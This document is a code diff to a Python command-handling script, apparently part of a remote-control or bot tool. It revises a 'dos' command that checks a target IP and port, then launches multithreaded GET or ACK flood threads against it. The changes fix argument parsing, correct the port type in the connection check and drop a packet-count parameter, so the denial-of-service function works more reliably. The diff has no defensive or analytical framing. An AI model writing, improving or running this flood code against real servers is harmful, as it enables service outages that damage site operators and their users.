@@ -55,7 +55,7 @@ scripts_name = {
                         """,
     "playsound":        "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
     "openurl":          "`openurl <url> <how-many-times>` Will open a specified url n times",
-    "dos":              """`dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size> <packet-number>` Will run dos on server"""
+    "dos":              """`dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` Will run Denial-Of-Service Attack."""
 
 }
 
@@ -552,15 +552,12 @@ def openurl(logger, command):
 def dos(logger,command):
     splitted_command = split_command(command)
 
-    dostype = splitted_command[2]
-    target = splitted_command[3]
-    port = splitted_command[4]
-    thread_num = splitted_command[5]
-    payload = splitted_command[6]
-    packet = splitted_command[7]
-    if all(var.isdigit for var in [port,thread_num,payload,packet]) and isinstance(
-        target,str
-        ):
+    dostype = splitted_command[1]
+    target = splitted_command[2]
+    port = splitted_command[3]
+    thread_num = splitted_command[4]
+    payload = splitted_command[5]
+    if all(var.isdigit for var in [port,thread_num,payload]):
         pass
     else:
         logger.error("Data was not correct.")
@@ -570,16 +567,15 @@ def dos(logger,command):
     try:
         logger.info(f"Checking IP {target} on port {port}")
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-        s.connect((target, port))
+        s.connect((target, int(port)))
+        s.close()
     except:
         logger.error(f"IP {target} on port {port} failed.")
         return f"IP {target} on port {port} failed."
 
-
-
     else:
         try:
-            payload = random._urandom(int(payload))
+            payload = random._urandom(int(payload)) if dostype.lower() == "ackflood" else 1
         except:
             logger.error("Payload too big. Aborting.")
             return "Payload too big , try smaller payloads."
@@ -587,7 +583,7 @@ def dos(logger,command):
             try:
                 logger.info("Starting Dos Attack...")
                 dos = util.dos(
-                    target,int(port),payload,int(packet),dostype
+                    target,int(port),payload,dostype
                 )
                 for i in range(int(thread_num)):
                     thread = threading.Thread(target=dos.attack)
@@ -595,7 +591,6 @@ def dos(logger,command):
             except:
                 logger.error("Something Failed. Maybe The Servers Are Down !")
                 return "Something Failed. Maybe The Servers Are Down !"
-
 
         
 
